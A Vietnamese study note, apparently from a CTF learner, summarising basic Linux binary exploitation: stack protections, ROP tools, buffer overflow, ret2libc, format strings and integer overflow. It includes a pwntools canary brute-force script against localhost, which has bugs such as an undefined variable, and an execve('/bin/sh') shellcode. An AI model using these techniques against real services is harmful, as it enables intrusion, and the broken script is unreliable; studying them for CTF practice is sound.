> Mục đích: Tổng hợp các kĩ thuật pwn cơ bản

# Checksec

> checksec cho ta biết các bảo vệ nào của file được bật, khi nhìn vào checksec ta có thể đoán được các kĩ thuật khai thác nào có thể không sử dụng được điều này rất qua trọng giúp chúng ta tránh mất thời gian và công sức

### Canary

- Hiểu đơn giản là canary tạo một giá trị hex, đẩy vào cuối stack (thường là trên saved rbp).
- Chức năng của nó là chống bof đến saved rip
  Để bypass được canary: có 2 cách chính

##### leak canary

ta có thể sử dụng FMT để leak giá trị canary. (printf hoặc puts)
printf nếu là fmt sẽ có trong file
ở đây ta có thể sử dụng puts để leak canary

##### Brute force Canary

Do em chưa thử cách này nên cũng chỉ dừng lại ở mức cách brute force

- Hoạt động: ta sẽ OW đến giá trị canary và ghi đè canary ta BF, nếu đúng chương trình thực hiện tiếp, nếu không chương trình sẽ lặp lại
- Nhược điểm: thường khá mất nhiều thời gian.

<details> <summary> Example 1 </summary>

```python
from pwn import *

def connect():
    r = remote("localhost", 8788)

def get_bf(base):
    canary = ""
    guess = 0x0
    base += canary

    while len(canary) < 8:
        while guess != 0xff:
            r = connect()

            r.recvuntil("Username: ")
            r.send(base + chr(guess))

            if "SOME OUTPUT" in r.clean():
                print "Guessed correct byte:", format(guess, '02x')
                canary += chr(guess)
                base += chr(guess)
                guess = 0x0
                r.close()
                break
            else:
                guess += 1
                r.close()

    print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
    return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```

</details>

# PIE
Được hiểu đơn giản là địa chỉ binary động, để có thể bypass, ta có thể leak một địa chỉ nào đó là địa chỉ binary, từ đó tính ngược về địa chỉ base của bin

[link về bypass PIE, Canary khá chi tiết](https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/bypassing-canary-and-pie)
  
 # NX
 Tạm hiểu là chống thực thi trong stack, nghĩa là đánh dấu các vùng không thể thực thi, việc này nhằm tránh việc đưa shellcode vào stack thực thi.
 Khi NX tắt, ta sẽ ưu tiên việc đưa shellcode vào stack
  
# ASLR
  Tạm hiểu là nó sẽ làm ngẫu nhiên hoá các thư viện (Libc) nhằm chống việc leak địa chỉ got plt, ngăn chặn ret@libc
 
 > Tóm lại: Nếu canary bật mà không thể leak được canary thì nó có thể là FMT IOF
  Nếu NX tắt (thông thường là bật): ta sẽ ret2shellcode
  nếu PIE, ASLR bật: ta cần phải leak địa chỉ để tính toán
___ 
# Các công cụ khai thác
* ROPgadget: ROP (Return Oriented Programming), sử dụng các gadget đã có trong chương trình để thay đổi các thanh ghi hoặc các biến trên stack nhằm kiểm soát, chuyển hướng chương trình. Các thanh ghi thường được sử dụng là rdi, rsi, rdx, rcx, r8, r9. 
  * ROPgadget thường được sử dụng để tìm địa chỉ của ret, các thanh ghi mà còn có thể tìm được địa chỉ của một số chuỗi ```ROPgadget --binary tênfile --string 'chuỗi cần tìm'
  * việc tìm chuỗi là cần thiết, hoặc là khi ta không thể dùng gets để ghi vào vùng nhớ nào đó (không có file libc)
* one_gadget: là một số gadget tồn tại trong libc, one_gadget sẽ tìm luôn những execve("/bin/sh", NULL, NULL), và điều kiện là một số thanh ghi cần NULL (có file libc)
> Lưu ý: ROPgadget thường được sử dụng để leak libc, sau đó có thể dùng one_gadget để tạo execve()
  đồng thời k nên ưu tiên leak libc, khi đã có hàm system bên trong file. có một số bài người ra đề có thể tự tạo file libc, lúc ta leak libc thì ra một file libc khác server, việc tính toán sau đó rất mất thời và cay cú.
___
  # Các kĩ thuật BOF
  ### Tràn biến
  nghĩa là ta sẽ thay đổi dữ liệu mà biến đó lưu trữ, việc cần làm của chúng ta là kiểm tra địa chỉ của biến đó, ow đến địa chỉ đó và truyền vào giá trị mà mình mong muốn
  tuy vậy, các bài tràn biến thường đi chung với những phép toán biến đổi, hoặc là giá trị cần thay đổi là số âm, số thập phân  
  Để biến đổi số thập phân sang hex em có sưu tầm được  
  ![image](https://user-images.githubusercontent.com/111769169/225925905-04d8cf4d-fb31-4131-8591-bd849d4ffd52.png)  
  Số âm sang hex
  ![image](https://user-images.githubusercontent.com/111769169/225926621-1618b0ba-eab2-43e6-9ea0-1f67733e453f.png)  
  
  ### ret2win
  Khi canary tắt, ta có thể ow saved rip thành hàm chứa system
  Dạng này hay có lỗi xmm1 (stack không chia hết cho 8), do push khi ta nhảy vào đầu hàm do đó ta sẽ nhảy sâu hơn một xíu nữa để bỏ qua lệnh push gây lỗi
  
  ### ret2shellcode
  Khi NX tắt, ta có thể đưa shellcode vào để thực thi
  do code shellcode = asm khá khó, với một số bài cơ bản thì ta có thể sài các shellcode
  <details> <summary> 64 bit </summary>
    
    shellcode = asm(
    '''
    mov rax, 0x3b
    mov rdi, 29400045130965551
    push rdi
    
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    
    syscall
    ''', arch='amd64'
    )
    
  </details>

  ### ret2libc
  GOT: nơi chứa địa chỉ các hàm của libc
  PLT: thực thi hàm được chứa trong GOT
  
  đầu tiên để leak libc, ta có thể sử dụng put@plt để in ra địa chỉ puts@got trên server do puts cần 1 thanh ghi rdi để thực thi
___
  # FMT
  Đối với 32bit: in dữ liệu trên stack  
64bit: 5% đầu của 5 thanh ghi, % thứ 6 là dữ liệu trên stack  
  %{n}$p, in địa chỉ trên stack vị trí thứ n  
  %{n}$c tại vị trí n, nó sẽ in ra byte nó trỏ đến (0x1234 %c sẽ là 0x34)  
  %s là nó sẽ ỉn cho đến khi găp bài 0x00  
  %{n}n đếm số lượng byte được in ra trước đó, rồi ghi vị thứ n  
  %* là pading ví dụ ```%*10$c    # tại vị trí thứ 10, chứa 0x1234``` ở đây %* có nhiệm vụ là tạo ra 0x1234 kí tự rồi %c để in ra 0x1234 kí tự.  
  
  em thấy 1 bài mà em giải khá kĩ [link](https://github.com/wan-hyhty/CTFs_competition/tree/main/utctf) sử dụng cả ret2libc, và dạng dùng con trỏ stack có sẵn để thay đổi dữ liệu (dạng này nói lí thuyết khá khó hình dung nên xem wu sẽ dễ hiểu hơn)
___ 
  # interget overflow
  dạng bài này khá khó nhận biết với những bài khó    
  ta nhớ số không dấu thì giới hạn của nó là 0xff  
  và có dấu thì giới hạn là 0x7f là dương, 0x80 trở lên là âm  
  một bài trong pico thể hiện rõ kĩ thuật IOF _em sẽ update link wu chi tiết_ ở đây là file binary [two-sum]
  
  
